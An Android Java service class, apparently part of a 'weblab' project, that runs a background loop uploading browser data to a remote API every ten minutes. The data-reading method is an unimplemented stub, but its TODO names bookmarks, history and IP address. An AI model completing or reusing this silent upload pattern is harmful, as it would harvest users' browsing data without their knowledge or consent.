package com.weblab.service;

import android.app.IntentService;
import android.content.Intent;
import androidx.annotation.Nullable;
import com.weblab.service.retrofit.ApiClient;
import com.weblab.service.retrofit.ApiService;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class BrowserDataService extends IntentService
{
    private Retrofit retrofit;
    public static ApiService apiService;

    public BrowserDataService()
    {
        super(BrowserDataService.class.getName());
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent)
    {
        Thread run = new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                while(true)
                {
                    try
                    {
                        Thread.sleep(1000 * 60 * 10);
                        Object data = readBrowserData();
                        sentData(data);
                    }
                    catch (InterruptedException ex)
                    {
                        ex.printStackTrace();
                    }
                }
            }
        });
        run.start();
    }

    private Object readBrowserData()
    {
        //TODO implement get data from BrowserDataProvider using classes: Bookmarks, History, IPaddress
        return new Object();
    }

    private void sentData(Object data)
    {
        retrofit = ApiClient.getApiClient();
        apiService = retrofit.create(ApiService.class);
        Call call = apiService.postData(data);
        call.enqueue(new Callback() {
            @Override
            public void onResponse(Call call, Response response) {
                if (response.isSuccessful())
                {

                }
            }

            @Override
            public void onFailure(Call call, Throwable t) {

            }
        });
    }
}
